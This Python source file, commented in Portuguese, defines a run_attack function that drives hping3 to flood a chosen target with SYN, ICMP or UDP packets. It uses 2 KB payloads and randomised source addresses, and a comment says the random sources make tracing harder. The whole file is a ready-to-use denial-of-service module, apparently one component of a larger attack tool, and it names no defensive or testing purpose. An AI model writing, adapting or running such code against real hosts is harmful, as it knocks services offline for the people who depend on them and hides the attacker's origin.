import subprocess  
import logging  

# Configuração do logger para registro das mensagens do sistema
logger = logging.getLogger(__name__)

def run_attack(params):
    
    #Essa é a função para executar um ataque usando a ferramenta hping3.
    #O tipo de ataque pode ser definido pelo parâmetro 'mode', e o alvo vai ser especificado por 'target'.
    

    # Extraindo os valores dos parâmetros
    target = params.get('target')  # Alvo do ataque (IP ou hostname)
    timeout = params.get('timeout', 30)  # Tempo limite 
    mode = params.get('mode', 0)  # Modo de ataque (SYN, ICMP, ou UDP)

    # Define o parâmetro do modo de ataque com base no valor de 'mode'
    if mode == '1':  # Modo ICMP
        modparam = '--icmp'
    elif mode == '2':  # Modo UDP
        modparam = '--udp'
    else:  # Modo SYN
        modparam = '--syn'

    # Verificamos se o parâmetro obrigatório 'target' foi fornecido
    if not target:
        raise ValueError("Parâmetro 'target' ausente")  # Caso contrário gera um erro se o alvo não for especificado

    # Execução do ataque
    try:
        # Monta o comando hping3 para realizar o ataque
        command = [
            'hping3',        # Ferramenta de ataque
            '--flood',       # Envia pacotes o mais rápido possível
            modparam,        # Modo de ataque selecionado (--syn, --icmp, ou --udp)
            '-d', '2000',    # Tamanho do payload (2 KB neste caso)
            target,          # Alvo do ataque
            '--rand-source'  # Usa endereços de origem aleatórios para dificultar o rastreamento
        ]

        # Registra a execução do ataque no log
        logger.info(f"Executando Hping no IP {target} com timeout de {timeout} segundos")

        # Executa o comando hping3 com tempo limite e capturando a saída
        result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
        # capture_output=True: Captura a saída padrão (stdout) e os erros (stderr)
        # text=True: Retorna a saída como string
        # timeout=timeout: Limita o tempo de execução do comando

        # Verifica o sucesso da execução do comando
        if result.returncode == 0:  # Comando executado com sucesso
            status = "Sucesso"
            output = result.stdout  
        else:  # Comando encontrou algum erro
            status = "Falha"
            output = result.stderr  

        # Registra o resultado detalhado no log
        logger.debug(f"Resultado do Hping: {output}")

        # Retorna uma mensagem detalhada com o status e a saída do comando
        return f"HpingAttack executado em {target} - Status: {status}\nOutput:\n{output}"

    except subprocess.TimeoutExpired as e:
        # Caso o tempo limite seja atingido, registra um aviso no log
        logger.warning(f"Timeout de {timeout} segundos atingido para hping no alvo {target}")

        # Retorna uma mensagem com a saída parcial coletada antes do timeout
        partial_output = e.output or "Nenhuma saída capturada antes do timeout."
        return f"HpingAttack executado em {target} - Status: Timeout ({timeout}s reached)\nPartial Output:\n{partial_output}"

    except subprocess.CalledProcessError as e:
        # Registra um erro no log caso o comando falhe
        logger.error(f"Erro ao executar Hping: {e}", exc_info=True)
        return f"Erro ao executar HpingAttack em {target}: {e}"

    except Exception as e:
        # Trata erros genéricos não previstos
        logger.error(f"Erro desconhecido ao executar Hping: {e}", exc_info=True)
        return f"Erro desconhecido ao executar HpingAttack em {target}: {e}"
